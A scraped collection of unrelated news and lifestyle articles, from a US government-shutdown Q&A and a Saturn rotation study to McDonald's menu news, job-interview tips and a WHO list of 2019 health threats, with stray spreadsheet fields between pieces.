While unlikely to happen again, during the 1995-1996 shutdown more than 10,000 Medicare applicants were temporarily turned away every day of the shutdown. Environmental and Food Inspection : In 2013, the Environmental Protection Agency (EPA) halted site inspections for 1,200 different sites that included hazardous waste, drinking water, and chemical facilities, and the Food and Drug Administration (FDA) delayed almost 900 inspections. During the 2018-2019 shutdown, the FDA restored some food inspections a few weeks into the funding lapse for products that were considered high-risk.

National Parks : During the 2013 shutdown, the National Park Service turned away millions of visitors to more than 400 parks, national monuments, and other sites. The National Park Service estimated that the shutdown led to more than $500 million of lost visitor spending nationwide. Many parks remained open during the 2018-2019 shutdown, though no visitor services were provided and damage and trash build-up were reported at many sites nationwide.

Air Travel : During the 2018-2019 shutdown, air travel was strained as a result of air traffic controllers and Transportation Security Administration (TSA) agents working without pay. Travelers faced longer lines as some TSA agents did not report to work and security checkpoints were closed, while the absence of 10 air traffic controllers temporarily stopped travel at LaGuardia Airport and caused delays at several major airports.

In 2013, states were forced to front the money for formula grant programs such as Temporary Assistance for Needy Families (TANF, sometimes described as “cash welfare”).

Internal Revenue Service (IRS) : In the event of a shutdown, the IRS would not be able to provide its normal service of verifying income and Social Security numbers. In 2013, a backlog of 1.2 million such requests delayed mortgage and other loan approvals, and billions of dollars of tax refunds were also delayed. At least 26,000 furloughed IRS employees were recalled to work during the 2018-2019 shutdown in preparation for tax season, but 14,000 did not show up to work without pay.

Supplemental Nutrition Assistance Program (SNAP): Though funding for the SNAP program is mandatory, the ability to send out “food stamp” benefits could be affected by a shutdown, since continuing resolutions have generally only authorized the Department of Agriculture (USDA) to send out benefits for 30 days after a shutdown begins. During the 2018-2019 shutdown, the USDA paid February SNAP benefits early on January 20, just before the 30-day window ended, but it would have been unable to pay March benefits had the shutdown continued. In addition, during any shutdown, stores are not able to renew their Electronic Benefit Transfer (EBT) card licenses, so those whose licenses expire would not be able to accept SNAP benefits during a shutdown.

Is the government preparing for a shutdown?

OMB maintains a list of the various contingency plans federal agencies will follow during a shutdown. Most have been updated within the past three years, but some have not been updated since a shutdown threat in late 2015.

How would federal employees be affected?

A full shutdown would be more extensive than the partial shutdown that started in December 2018 when Congress had enacted 5 of the 12 appropriations bills. A full shutdown would likely be similar to recent ones in 2013 and early 2018 when approximately 850,000 out of 2.1 million non-postal federal employees were furloughed. In 2013, most of the 350,000 civilian employees at the Department of Defense were summoned back to work within a week. Furloughed employees are not allowed to work and do not receive paychecks but are guaranteed back pay due to legislation passed in January 2019. Federal contractors have historically not received back pay.

At the beginning of the partial 2018-2019 shutdown, an estimated 380,000 employees were furloughed, a smaller number than usual since large federal employers such as the Department of Veterans Affairs and the Department of Defense were already funded. Another 420,000 employees reported to work but did not receive pay until the shutdown ended. As the 2018-2019 shutdown continued, departments and agencies such as the IRS and State Department recalled an increasing number of employees.

How and why do mandatory programs continue during a shutdown?

Whereas discretionary spending must be appropriated every year, mandatory spending is authorized either for multi-year periods or permanently. Thus, mandatory spending generally continues during a shutdown. However, some services associated with mandatory programs may be diminished if there is a discretionary component to their funding. For instance, during the 1996 shutdowns and the 2013 shutdown, Social Security checks continued to go out. However, staff who handled new enrollments and other services, such as changing addresses or handling requests for new Social Security cards, were initially furloughed in 1996. In 2013, certain activities were discontinued, including verifying benefits and providing new and replacement cards, but processing of benefit applications or address changes continued. During the 2018-2019 shutdown, the Department of Agriculture had to rely on a special authority included in the previous CR to allow them to continue to issue SNAP benefits.

How many times has the government shut down?

Since Congress introduced the modern budget process in 1976, there have been 20 “funding gaps,” including the 2018-2019 shutdown and the one in January 2018, when funds were not appropriated for at least one day. (The hours-long lapse in appropriations in February 2018, though sometimes characterized as a shutdown, did not result in federal employee furloughs.) However, before 1980, the government did not shut down but rather continued normal operations through six funding gaps. Since 1981, 10 funding gaps of three days or fewer have occurred, mostly over a weekend when government operations were only minimally affected.

There have now been four “true” shutdowns where operations were affected for more than one business day. The first two happened in the winter of 1995-1996 when President Bill Clinton and the Republican Congress were unable to agree on spending levels and the government shut down twice, for a total of 26 days. The third was in 2013 when a House and Senate standoff over funding for the Affordable Care Act (ACA) resulted in a 16-day shutdown. The fourth shutdown, starting in December 2018 and continuing into January 2019, centered on a dispute over border wall funding and was the longest-lasting shutdown at 35 days.

Does a government shutdown save money?

While estimates vary widely, evidence suggests that shutdowns tend to cost, not save, money for a number of reasons. For one, putting contingency plans in place has a real cost. In addition, many user fees and other charges are not collected during a shutdown, and federal contractors sometimes include premiums in their bids to account for uncertainty in being paid. While many federal employees are forced to be idle during a shutdown, they have historically received and are now guaranteed back pay, negating much of those potential savings. OMB official estimates of the 2013 government shutdown found that $2.5 billion of pay and benefits were paid to furloughed employees for hours not worked during the shutdown, as well as roughly $10 million of penalty interest payments and lost fee collections.

Shutdowns also carry a cost to the economy. The Congressional Budget Office (CBO) estimated that the 2018-2019 shutdown reduced Gross Domestic Product (GDP) by a total of $11 billion, including $3 billion that will never be recovered. On top of that effect, CBO notes that longer shutdowns negatively affect private-sector investment and hiring decisions as businesses cannot obtain federal permits and certifications, or access federal loans. A 2019 Senate report found that the three government shutdowns in 2013, 2018, and 2019 cost taxpayers nearly $4 billion.

How can Congress avoid a shutdown?

There are essentially two ways to avoid a government shutdown – by passing appropriations or a continuing resolution (see question on “What is a Continuing Resolution?”). Theoretically, the House and Senate Appropriations committees are supposed to pass 12 different appropriations bills that are broken up by subject area and based on funding levels allocated in a budget resolution. Often, these bills are combined into larger “omnibus” or “minibus” legislation.

To avoid a shutdown, Congress would need to pass all 12 appropriations bills through both chambers and get them signed by the President before October 1. This could be done by enacting each bill individually or by packaging them together through an omnibus or minibus. On September 21, the House passed a continuing resolution that would extend current funding levels through December 3 and suspend the debt limit until near the end of 2022. Senate action is uncertain, however, due to the lack of needed Republican support for raising the debt limit under regular Senate rules as well as specific funding disagreements, including appropriations for the Iron Dome missile defense system in Israel. For more about the status of specific appropriations bills, see Appropriations Watch: FY 2022.

What is a Continuing Resolution (CR)?

A continuing resolution temporarily funds the government in the absence of full appropriations bills, often by continuing funding levels from the prior year. Traditionally, CRs have been used to give lawmakers a short period of time to complete their work on remaining appropriations bills while keeping the government open. CRs sometimes apply to only a few categories of spending, but they can also be used to fund all discretionary functions and can be used for an entire year.

CRs differ from normal appropriations bills in that they often “continue” funding allocations from previous bills at the prior year’s rate or through a formula based on the prior year’s rate. Even when overall funding levels have differed, lawmakers have often simply scaled up all accounts by a percent change in spending rather than making individual decisions on spending accounts. However, CRs often do include certain “anomalies,” where specific items are increased or decreased to work around some problems that would occur from continuing the previous year’s policies, or “policy riders,” where certain funding restrictions are specified in order to dictate policy. Colloquially, a “clean CR” does not contain policy riders or politically motivated changes to funding levels.

How often does Congress pass CRs?

Congress frequently passes CRs when lawmakers are unable to agree on appropriations before a deadline, and occasionally multiple CRs are necessary to fund the government for an entire fiscal year. Congress also sometimes relies on CRs during presidential transition years. In FY 2001, for example, a series of intense congressional negotiations leading up to the 2000 election led to a series of 10 one-day CRs. In total, Congress funded the first three months of that fiscal year with 21 continuing resolutions.

Not surprisingly, CRs have been quite prevalent recently and were used to fund the government entirely in FY 2011, when eight CRs were passed, and in FY 2013, when two CRs were passed. In fiscal years 2012, 2014, 2015, 2016, 2020, and 2021, CRs were used to fund the government for roughly a quarter of each year. FY 2017 funding negotiations necessitated three CRs before the passage of an omnibus appropriations bill in May 2017, and FY 2018 negotiations required five CRs before the passage of an omnibus in March 2018. In FY 2019, a CR was used for seven of the 12 appropriations bills for more than one-third of the year before the enactment of an omnibus in February 2019, while the remaining five appropriations bills were funded before the fiscal year began. The most recent year when a full-year appropriations bill passed before the fiscal year began and no CRs were necessary was FY 1997.

What are the disadvantages of using CRs?

Continuing resolutions have several negative implications for the budget’s overall efficiency. CRs usually continue funding at the past year’s level without any regard for changing policy needs or the value of each program within an agency. Using a continuing resolution wastes hundreds of hours of careful consideration and program evaluation incorporated into each agency’s budget submission. For instance, the President’s annual budget proposes a list of eliminations and reductions of programs that are duplicative or ineffective; a continuing resolution will continue to fund these unwanted programs. Finally, the use of continuing resolutions disrupts activities within agencies, makes it difficult to plan or start future projects, and costs staff time to revise work plans every time the budget changes.

How is Congress addressing funding?

Although Congress has not yet enacted any appropriations bills as of mid-September, the House has passed nine out of 12 appropriations bills. The full Senate has not yet taken any action on appropriations for FY 2022, despite the Senate Appropriations Committee reporting out three of its bills. The House and Senate would have to agree on and pass the same versions of the bills before they are presented to the President for his signature. Congress is expected to consider a continuing resolution that would extend funding, largely at current levels, to allow more time to complete appropriations. For more about the status of specific appropriations bills, see Appropriations Watch: FY 2022.

How does a shutdown differ from a default?

In a shutdown, the federal government temporarily stops paying employees and contractors who perform government services, whereas in a default the list of parties not paid is much broader. In a default, the government exceeds the statutory debt limit and is unable to pay some of its creditors (or other obligations). Without enough money to pay its bills, all of the federal government’s payments are at risk — including all government spending, mandatory payments, interest on our debts, and payments to U.S. bondholders. While a government shutdown would be disruptive, a government default could be disastrous. For more on a default, see our Q&A: Everything You Should Know About the Debt Ceiling.)

How does a shutdown differ from “sequestration” or “sequester”?

A government shutdown closes down non-essential government operations due to a lack of funding, whereas a sequester or sequestration is shorthand for the reductions in discretionary spending caps that were in place up until the most recent fiscal year that constrained the total amount of funding for annually appropriated programs.

The first example of sequestration was included in the Gramm–Rudman–Hollings Balanced Budget and Emergency Deficit Control Act of 1985. The most recent version of sequestration, a product of the Budget Control Act (BCA) of 2011, resolved the 2011 debt ceiling negotiations. The BCA created a Joint Select Committee on Deficit Reduction (the “Super Committee”) to identify at least $1.5 trillion of deficit reduction over 10 years, and set in motion the sequester if it did not identify at least $1.2 trillion. The failure of the Super Committee triggered sequestration, causing discretionary spending caps to be automatically lowered for both defense and non-defense. Congress has never allowed the full sequester to take effect, passing partial sequester relief in 2013 and 2015, and more than fully reversing the sequester in 2018 and 2019. If appropriations bills violated the increased spending caps, then across-the-board cuts would have been triggered.

It consists of sesame topped buns, two beef patties, two slices of cheese, lettuce, onions, Big Mac sauce and bacon and costs £4.08.

Meanwhile, the Mac Junior is a small version of the Big Mac and is made up of just one beef patty, a slice of cheese, lettuce, onion, pickles and Big Mac sauce, sandwiched together in a sesame topped bun. It is priced at £2.29.

The bacon-filled Big Mac, Grand Mac and the Mac Junior will only be available in restaurants nationwide until 19 March, so you’ll want to get your greasy mitts on the limited-edition burgers pronto.

Michelle Graham-Clare, head of marketing at McDonald’s UK & Ireland, said: “The customer reaction to our Grand Big Mac and Mac Jr last year was phenomenal, the love for the iconic Big Mac surpassed all expectations.

“Which is why I am delighted to introduce bacon to the Big Mac range, a twist on a classic.”

On 29 January, participating McDonald’s restaurants in US will also offer customers free bacon in a launch dubbed “Bacon Hour”.

Diners will be able to add bacon, without charge, on the side with any menu item for one full hour from 4-5pm, local time.

The Big Mac was created by Jim Delligatti, a Pennsylvania McDonald’s franchise owner, who wanted to create a hamburger big enough to feed hungry steel workers who arrived at his restaurant after work.

Delligatti came up with the burger – that included two beef patties – and served it for the first time in his Uniontown, Pennsylvania, McDonald’s in 1967.

A mum has been slammed online after revealing a weird habit that she thought was completely normal.

Mumsnet user 'meladeso' posted in the popular parenting forum asking if what she does is 'absolutely disgusting'.

Writing in the 'Am I being unreasonable' section, she said: ""Would it be absolutely disgusting to put loo brushes in the dishwasher on their own, on the hot setting, followed by a hot on empty??!!!""

Unfortunately for the mum, her admission sent users into a frenzy with many saying what she does is 'disgusting'.

One wrote: ""I'd have to discard the dishwasher afterwards.""

Another said: ""That is disgusting!""

User ErictheGuineaPig wrote: ""Jesus Christ, why????

""Why would you need your loo brush to be that clean when it just gets used to clean a loo?

""Why would your risk contaminating your food area for it? I can't fathom what you're thinking is here?!""

A fifth agreed: ""Gag moment. Can’t believe you’re even considering it.""

And for one user it put them off food: ""This thread has put me off eating or drinking anything in anyone else’s house ever in case they do this.""

But some didn't see what the issue was.

Turns Out the Royals Don't Wear Seat Belts for a Pretty Legit Reason

It's for their...safety?

From Cosmopolitan

Ever since Prince Philip had his car accident, there's been a lot of ~chatter~ about the fact that the royal family often don't wear seat belts. In fact, Queen Elizabeth was seen driving sans seat belt in the wake of Philip's accident, which is pretty, uh...questionable.

The thing is, the royal fam actually has a good-ish reason for being so unsafe. And ironically that reason has to do with their own personal safety. Speaking to Hello Magazine, former royal protection officer Simon Morgan explained that sometimes royals don't wear seat belts in order to escape quickly in an emergency.

""There are always anomalies,"" Morgan said. ""In the threat and risk matrix it's a matter of looking at each individual situation to decide what is the best way of achieving what needs to be achieved. For example, considering that a quick entry or exit to a vehicle is easier when people aren't strapped into seat belts.""

He added, ""Also, what is significant about this event or situation? Is an individual's look and appearance important? And also an individual's choice. Protection is a very unique area of policing and there are a lot grey areas, but you are always judging each situation to weigh up the risks and threats with the outcomes you are trying to achieve.""

Guess that settles that! But for what it's worth, the younger royals know whattup:

",25/01/2019 10:48,https://www.nationalgeographic.com/science/article/how-long-is-day-on-saturn-astronomers-just-found-out#:~:text=The%20answer%3A%2010%20hours%2C%2033%20minutes%2C%20and%2038%20seconds.,"The beauty of Saturn’s delicate system of rings is indisputable, but human fascination with them isn’t all about aesthetics; those rings can tell us incredible scientific stories, too.

Now, a study published in The Astrophysical Journal has used the planet’s rings to answer a surprisingly frustrating question: How long is a day on Saturn? The answer: 10 hours, 33 minutes, and 38 seconds.

3:51

This revelation is important because it’s “a fundamental property of any planet in the solar system,” notes University of Iowa physicist Bill Kurth, who worked on NASA’s Cassini mission to Saturn but who was not on the study team. Knowing how long a given planet’s day lasts can help with interpreting its gravitational field and its internal structure. But for the ringed planet, it’s a variable that astronomers have been struggling with for decades.

“Saturn is the only planet whose rotation is hard to measure,” says Matthew Tiscareno, a senior research scientist at the SETI Institute who wasn’t part of the new study. He explains that the terrestrial planets have surface features that can be tracked. The other three gas giants don’t, but they have tilted magnetic fields that wobble as these planets rotate, and the disturbances can be used to work out each planet’s rate of rotation.

Saturn, however, wasn’t playing ball. The gassy world’s swirling, chaotic clouds mean that no surface features can be properly tracked. At the same time, several spacecraft orbiting Saturn have confirmed that its magnetic field is freakishly on-the-level, aligned near-perfectly with its rotational pole. That means its rotation doesn’t cause any measurable change in its magnetic field.

The snare drum of the solar system

For years, it wasn’t clear how to solve this conundrum. Then, a research team led by Christopher Mankovich, a graduate student in astronomy and astrophysics at the University of California, Santa Cruz, had an idea.

Saturn’s rings are far from static. They sometimes ripple or experience waves, normally when orbiting moons tug at them as they pass near all that ice and dust. But these waves can also be triggered by the oscillations of material deep within Saturn’s enigmatic interior. If a moving mass creates localized changes in the planet’s gravitational field, then that pulls at the rings, too.

It’s a bit like a snare drum: Something rocks the main instrument, and the snare shakes in response.

“Although you can't hear its oscillations, Saturn is very much like a musical instrument,” Mankovich explains. “Its timbre, as in the set of allowed frequencies for its oscillations, is dictated by its overall structure: its size, shape, composition, temperature, and so on.”

It doesn’t take much effort to trigger those waves. If a mass equal to one of Saturn’s moderate-size moons shifts around within the planet, it can cause part of the rings to slosh back and forth. If this sloshing matches up with the frequency of the ring’s orbit, it resonates, turning a small slosh into a clearly observable spiral wave.

Saturn is very much like a musical instrument.

The properties of these waves depend on what they are travelling through and what generated them. With this in mind, Mankovich’s team created a bespoke numerical model, designed to use the ring waves to work out what the interior structure of Saturn must be like. Their model not only revealed some of the planet’s inner workings, but it also managed to finally calculate the length of a Saturnian day.

The team has done “a careful and reliable job” at solving this persistent query, Tiscareno says.

A beast of a space probe

So, what took so long? The fact that Saturn’s internal mass and its errant behavior can cause ring waves was first evidenced in the early 1990s, says Tiscareno. And a series of recent studies led by the University of Idaho’s Matthew Hedman further built on the notion to develop what the team refers to as kronoseismology, or the ability to see what’s happening inside Saturn using the waves in its rings, a concept first suggested in 1982.

Finally cracking the mystery all came down to the late, great Cassini spacecraft, says James O’Donoghue, a planetary scientist at NASA’s Goddard Space Flight Center who was not involved in the study.

Plenty of spacecraft have visited Saturn, but Cassini—a “beast of a space probe”—circled the giant world for 13 years with instruments that could watch those rings in unprecedentedly high resolution. That enabled it to see tiny details that are “impossible to achieve” using ground-based telescopes, O’Donoghue says. (See, for instance, evidence from Cassini that the rings are raining on Saturn.)

Even though we know something within the gas giant is causing those ring waves to appear, no one knows what that something could be. One new paper on the preprint site arXiv.org suggests that giant impacts in Saturn’s distant past may to be responsible for “ringing the bell,” so to speak, and sparking the ongoing internal chaos, Mankovich notes.

But for the moment, he says, “the ultimate culprit for those oscillations inside Saturn remains a genuine mystery.”",How long is a day on Saturn? Astronomers just found out.,

Grandparents Are Furious After Shower Gel They Bought Their
Granddaughter Had A Lewd Message

Doting Richard Shiner and his wife Tracey were horrified when little Macy asked why the bottle of shower gel instructed her to “invite someone into the shower” with her to enjoy it fully.

The 54-year-old plasterer slammed the crude message and told The Sun: “It’s wrong. If I wanted something like that I’d have gone into an Ann Summers shop.”

He and Tracey, also 54, had given Macy a ‘Little Snow Fairy’ bath set from high street chain Lush - bought from the Chelmsford branch in Essex - because the name made it sound particularly child-friendly.

It contained shower gel and mouldable bath putty, while five-year-old brother Buddy was given a different set containing gel and a bath bomb.

But after Macy had unwrapped her gift at her grandparents’ home in Stanford-le-hope, Essex, on Christmas night, Richard discovered the offensive labelling on the bottle of shower gel.

He said: “My wife spends quite a bit of money in Lush and bought two sets for my two grandchildren.

""It didn’t say anything about age restrictions or anything.

“They opened their bits and pieces on Christmas night, and Macy undid her one.

“It was called ‘Little Snow Fairy’ which to me indicates it’s ideal for kids.

“I happened to pick up the bottle and was reading aloud how to use it.

""The instructions on the shower gel says: ‘How to use: If you really don’t know how to use this, then we suggest you find someone you really like and invite them into the shower with you to demonstrate.’

“I couldn’t believe it said that. Then of course Macy was asking me what it meant.

“I didn’t know what to say to her, so I had to pretend it meant she could bath with Buddy. But that’s not really appropriate either.

""It was the only thing I could think of to say to her at the time.”

Richard says he was so upset he broke the habit of a lifetime and decided to contact the chain’s HQ to complain.

He claims he was told several other customers have made similar complaints about the labelling and added: “I’ve never, ever in my life phoned a company to complain.

“But I phoned up and a girl answered the phone and although she didn’t actually laugh, I could tell from her tone of voice that she thought it was fine.

“I said ‘I don’t think it’s appropriate. It should have an age warning on it.’

“She put me on to the manager and he said, ‘They’re meant to be tongue in cheek.’

“I said to him: ‘It’s wrong. If I wanted something like that, I’d have gone to an Ann Summers shop.’

“And I told him, ‘Innuendo amongst adults is fine, but when you’ve got to explain to an eight-year-old what it means, I think that’s wrong.’

“He said I wasn’t the first person to complain about this - they’ve had four or five complaints over the past couple of years about it, but nothing’s been done about it. And he actually said this batch is aimed at children.

“He did apologise and offered me two free bath bombs, but I said it wasn’t about that - I wanted their labelling to be changed.

""He didn’t even take my name or address though, so I don’t think anything will be done.”

Never Wear This To A Job Interview, According To Employers
Take note.

Preparing for a job interview is never easy. There are so many things to consider: Will I be able to answer all the questions? Will I say “like” too much? How do I show off my personality and prove I’m the best candidate for the role? What do I wear? Or perhaps, more importantly, what don’t I wear?

According to various employers, there are a few items one should avoid when it comes to dressing for an interview.

The Absolute No-Nos

The worst offender might not come as a surprise: “Flip-flops,” Andy Limpus, director of talent acquisition at Penske Media Corporation (which owns Women’s Wear Daily and Variety) told HuffPost. “It happens and it’s the craziest thing and I don’t get it.”

Sarah Tam, head of fashion and buying at Rent The Runway, agreed that flip-flops, “under any circumstances, are a no.”

“Wear grown up shoes,” she said. “It’s important.”

Brian Ricci, executive administrator at Rich Brilliant Willing, a New York-based contemporary LED lighting design manufacturer, echoed the sentiment, as did Laurel Pantin, editorial and fashion director at Coveteur.

“Men, I would say absolutely no open-toe anything, ever,” Ricci said. He added that “for women, an open-toe sandal might be totally fine in the right climate.”

“I would say no beachy sandals generally,” Pantin said.

Ricci also advised against wearing any kind of workout gear or yoga pants, as well as anything that appears tattered or has holes in it. (So, yeah, maybe skip the hole-y Yeezy crop top, unless Kanye West himself is doing the interview.) Pantin added that visible bra straps should also be avoided.

Think About Your Scent

“Another thing that people need to think about is not just their clothing but their physical presence,” Limpus said. “What I mean by that is, think about the way you smell. There are people who are wearing too much cologne, there are folks that come to us and they’ve just left lunch and they smell like the restaurant.”

Pantin expressed a similar view, telling HuffPost, “I think a lot of people go very heavy-handed with their personal fragrance and I find that super distracting.”

Tiffanie Lai, people manager at Native Shoes in Vancouver, Canada, recommended erring on the side of caution when it comes to colognes or perfurmes, and perhaps skipping a scent altogether.

“You never know what sensitivities people have, especially when it comes to allergies,” she said.

Know What You’re Applying For

You only have one chance to make a first impression, so you want to make it count. That means when you’re scouring your closet (or store racks) looking for something that’s sure to impress, you need to be mindful of the position you’re applying for. You should also keep in mind where you’re applying, as different work environments have different dress codes.

“If I am interviewing someone for a creative position and they are sitting in front of me in a suit, I’m thinking they don’t really know us,” Limpus said. “If you’re interviewing for a creative job, you’re going to be a little more fashionable and creative in your own style. But if you’re interviewing for an accounting position, I do expect that person in a suit.”

“I think it’s more important to present yourself in a way that best represents the position more so than the company,” he added.

Lai said a good way to determine the vibe or feel of a certain workplace is to tap into your network ― reach out to the hiring manager or a contact who works there ― to see what sort of insight you can get.

Another great tip, especially for jobs that place a lot of emphasis on their social media branding, is to check their Instagram pages. There’s a chance there are office photos and photos of employees, which can give you an idea of the dress code.

Be Confident

If you’re looking for some fail-safe options, Tam suggested blazers, which come in a variety of shapes these days, a crisp white shirt or a chic dress.

As Pantin suggested, “A really great, interesting button-down shirt is always a good choice.”

“You just want to present the most polished version of yourself,” she said.

Tam said that, “regardless of the industry, it’s important to look pulled together and not sloppy. You want an outfit that will help you shine and not outshine you.”

“Most of all, you should probably feel like yourself. Think about how you would like to come across,” Tam added. “It’s important to think about what gives you confidence.”","What Not To Wear To A Job Interview, According To Employers",

But while we're all sat there binging on our choccies without even pausing to take a breath, one woman's put us all to shame by managing to hold off on eating an Easter egg for almost 50 YEARS.

The Cadbury Creme Egg now belongs to Ainslie Peters, 48, but it used to be her grandmother's.

Ainslie's grandmother, Jean Peters, was gifted the egg by her future husband, Dan Clark - who gave it to her on their first date back in 1973.

The present clearly won over Jean, who was in her 50s at the time and recently widowed, as the two quickly fell in love and tied the knot the following year.

The egg has remained a treasured family memento, and is kept in a glass cabinet with its foil wrapper still intact.

When Jean died in 2010, the egg was passed on to Ainslie, who keeps it on display at her home in Kirkcaldy, Fife.

She said: ""The egg is just something I remember from all of my childhood visits to see my gran in Glasgow, she kept it in a glass cabinet with her ornaments.

""Me and my three sisters did ask her about it but she would just laugh it off.

""Eventually she told us the story, that Dan had given it to her on their first date.

""My gran died in 2010 and it was the only thing I asked if I could have.""

Ainslie - who doesn't even like Creme Eggs herself - keeps the egg in a cabinet alongside an order of service from her dad's funeral, and a miniature wooden model of the Glasgow skyline.

She added: ""I'm quite a sentimental person.

""I keep stuff just because someone has given it to me.

""My dad's father passed away the year I was born, leaving my gran a widow.

""Dan had also been married before and I think his first wife died too.

""To find love again a couple of years after her husband died must have meant a lot for my gran.""

Jean treasured the Creme Egg, and had taken it with her when she moved from the flat she had shared with Dan in Kilbirnie, North Ayrshire, to sheltered housing.

Sadly, Dan died in 1981 - while Jean lived until the grand age of 94.

Ainslie continued: ""Gran stayed in their flat in Kilbirnie right up until she moved to sheltered housing in 2001 - the Creme Egg went with her.

""When she passed away in 2010 that was the one thing I asked for.

""It's just me being a bit of a daftie.

""I've never peeled the foil back and I wouldn't disturb it.""

The Creme Egg was launched by Cadburys in 1971, not long before Dan decided to give one to Jean.

Parents have the right to choose whatever name they wish for their children, but most of us will have the common sense not to name our kids something that could negatively impact them in life.

And while naming conventions continue to evolve and children with increasingly unusual monikers become more common, there are some words that just don't work as baby names.

One woman on Reddit has found herself battling against her sister when it comes to the name she's chosen for her baby boy, as she believes it will lead to her future nephew being ""mocked"", even if his mum thinks it's ""cool and unique"".

The name? Paradox.

Sharing her story anonymously, the woman explained: ""My sister is eight months pregnant, she told me a few weeks ago that she thinks she wants to name her baby boy Paradox, purely because it sounds cool and it's unique.

""I honest to god thought she was joking.""

The woman has tried texting her sister with alternative names she could pick instead but has left her sibling so angry that she's now been blocked on social media - with her sister ""refusing to acknowledge her existence"".

She added: ""Ever since then I've been texting her a bunch of names, hoping that she'll pick a different one.

""Yesterday she got super annoyed and asked me why I kept suggesting names when she already picked the name, so I had to be honest and I told her that Paradox is not a real name, and she and her son are gonna be mocked. I've genuinely been stressing out about it because I know she is making a massive mistake.

""Now she has blocked me on everything and is refusing to acknowledge my existence.""

The aunt-to-be admitted she understands her sister can name her baby whatever she wants, but at the same time thinks there's ""a line"" when it comes to appropriate monikers.

She said: ""I asked my mum what she thought and she agrees that the name is 'a little out there' but it's my sister's choice at the end of the day. I agree that people have the right to name their kid whatever they want but surely there is a line.""

Commenters on the Reddit post were split on the topic, as while some said she was right to point out how ridiculous she believes the name is, others insisted she should ""drop it"" and let her sister make the final decision.

One person said: ""You’re not the a**hole for letting your sister know your opinion, but you’ve done all you can do at this point. Drop it and let your sister make up her own mind.""

While another added: ""Just because she thinks it makes a cute baby name does not mean it makes a good adult name. That baby is only a baby for a very short time! No one in the adult world is going to take that guy seriously.""

""Even though you are correct and that is a ridiculous thing to call a baby, very few people on this planet want their family's negative feedback on their baby's name"", a third stated.

It is important to explicitly say that you want the job in order to appeal to an interviewer during and after an interview; particularly because it “opens the possibility of asking more important questions,” said human resources professional Cristian Rennella, questions like “Why do you want to work here?” and “How will this job fit with your professional goals?”

When a candidate is proactive about reiterating that they want the job that they are interviewing for, it also “helps the interview become more efficient and productive” added Renella. And it makes sense. If you can successfully articulate that you both want the job and really sell the reasons why, then you’re one step closer to hopefully securing a job offer.

Keep in mind though, that it’s all about balance, “There’s nothing worse than having negative people on your team, so when recruiting, most people are looking for signs of enthusiasm and positivity,” said Fiona Adler, hiring manager and creator of the Actioned App. And “You don’t want to sound desperate for the job, but you do want to let it be known that this job is a great fit for you and you’d be delighted to be offered the role. “

What keeps more job candidates from saying this four words? It could be an overall lack of interview preparation, or fear of sounding too eager.

“From my personal experience, one of the top reasons candidates don’t move to the next round in an interview (other than cultural fit or rambling) is that they can’t close the interview,” said Sarah Johnston, a former hiring manager and current job search coach.

Many experts seem to prefer a well-informed, well-prepared job candidate, who goes beyond just displaying enthusiasm for a role, according to President of Goldbeck Recruiting Henry Goldbeck, who said that the key lies in “ Not just saying, “I want this Job” but being enthusiastic, confident and informed about the job and what you will be able to accomplish.”

This means being able to explain why you want the job and how you plan to contribute to the company. And the best way to be able to do this is to do thorough research beforehand. Be in the know about a company’s mission, current and past initiatives, and its competitors.

You do actually have to want the job, in order to give a compelling and authentic interview. So be sure that the job is a fit before you say those four words.

There's A New Official Major Threat To World Health, And It's
Completely Ridiculous

",17/01/2019 14:52,https://www.iflscience.com/health-and-medicine/theres-a-new-official-major-threat-to-world-health-and-its-completely-ridiculous/,"The World Health Organization (WHO) has released its list of the top 10 dangers they believe to be the biggest threats to health in 2019. On there are many of the usual suspects, including Ebola, which saw several outbreaks in 2018, and dengue, which infects around 390 million people a year, as well as the likelihood the world will face another global influenza pandemic.

Joining these hard-to-tackle threats this year is one entirely preventable. Yes, the WHO have decided to add anti-vaxxers to the list of the biggest threats to world health.

VACCINE HESITANCY

Measles has seen a resurgence, with a global increase of 30 percent, despite vaccines to prevent measles being introduced in 1963 and the vaccine only being improved since then. An outbreak in Europe affected more than 41,000 people in 2018, up from just over 5,000 in 2016.

Rather than list the diseases themselves (although it also mentions the HPV vaccine and poliovirus) as threats to the world's health, the WHO has added the anti-vaccine movement itself as a threat.

""Vaccine hesitancy – the reluctance or refusal to vaccinate despite the availability of vaccines – threatens to reverse progress made in tackling vaccine-preventable diseases,"" they write in their release. ""Some countries that were close to eliminating [diseases] have seen a resurgence.

""Vaccination is one of the most cost-effective ways of avoiding disease – it currently prevents 2-3 million deaths a year, and a further 1.5 million could be avoided if global coverage of vaccinations improved.""

As well as anti-vaxxers, the WHO outlined these nine other threats to world health (in no particular order) that they will try to tackle in 2019:

Air pollution and climate change

The WHO list air pollution as the greatest environmental risk to health. Nine out of 10 people worldwide breathe polluted air every day, with around 7 million people dying prematurely every year as a result.

Non-communicable diseases

Chronic, non-transmittable diseases such as cancer, heart disease, and diabetes are the leading cause of mortality, causing 70 percent of deaths worldwide. Of the 41 million people a year who die due to non-communicable diseases, 15 million people die prematurely (aged between 30 and 69).

The WHO say that a rise in these diseases has been driven by the use of alcohol and tobacco, unhealthy diets and inactivity, and air pollution.

Global influenza pandemic*

""The world will face another influenza pandemic – the only thing we don’t know is when it will hit and how severe it will be,"" the WHO write about one of the most unpredictable threats on the list.

""Global defences are only as effective as the weakest link in any country’s health emergency preparedness and response system.""

An estimated 6.2 to 7.3 million people in the US have gotten sick from the flu during the 2018/19 flu season so far, according to the Centers for Disease Control and Prevention (CDC).

*Before you all nitpick and say that all pandemics are global, this is the way it was described by the World Health Organization and who are we to argue with the WHO?

Fragile and vulnerable settings

Over 6.1 billion people live in unstable environments, where crises (such as war and mass population displacement) can leave them without adequate food, water, or basic medical care.

Ebola and other high-threat pathogens

The Democratic Republic of Congo saw several Ebola outbreaks last year, which spread to densely populated cities, making the epidemics even more difficult to tackle.

As well as Ebola, the WHO list SARS, Zika, Nipah, and the ominously-named ""disease X"" as pathogens that we need to prepare properly for. Before you panic and think you have symptoms, ""disease X"" is a codename for an as-yet-unknown disease that could arise and spread through the population.

Antimicrobial resistance

The WHO have been quick to sound the alarm on antibiotic resistance, and this year it makes the list of biggest threats to humanity once again.

""A post-antibiotic era – in which common infections and minor injuries can kill – far from being an apocalyptic fantasy, is instead a very real possibility for the 21st Century,"" the WHO warned in 2014. Other than a few promising studies on new types of antibiotics, not much has changed and alarming scenarios for what happens when antibiotics stop working still loom large.

Dengue

